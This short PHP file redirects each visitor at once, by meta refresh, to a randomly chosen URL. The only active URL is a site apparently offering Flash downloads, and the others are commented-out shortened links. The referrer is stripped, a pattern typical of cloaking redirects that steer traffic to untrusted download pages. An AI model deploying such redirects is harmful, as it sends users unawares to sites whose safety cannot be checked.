<?php
$urls = array(
#"https://t.co/zy64Pqg8ER?amp=1",
#"https://t.co/wXPlPZkbco?amp=1",
#"https://t.co/PA7OAjbnas?amp=1",
#"https://t.co/MSXo7Imnbv?amp=1",
"https://flashdl.me",
); 
$url = $urls[array_rand($urls)];
?>
<meta name="referrer" content="no-referrer" />
<meta http-equiv="refresh" content="0;url=<? echo("$url"); ?>" />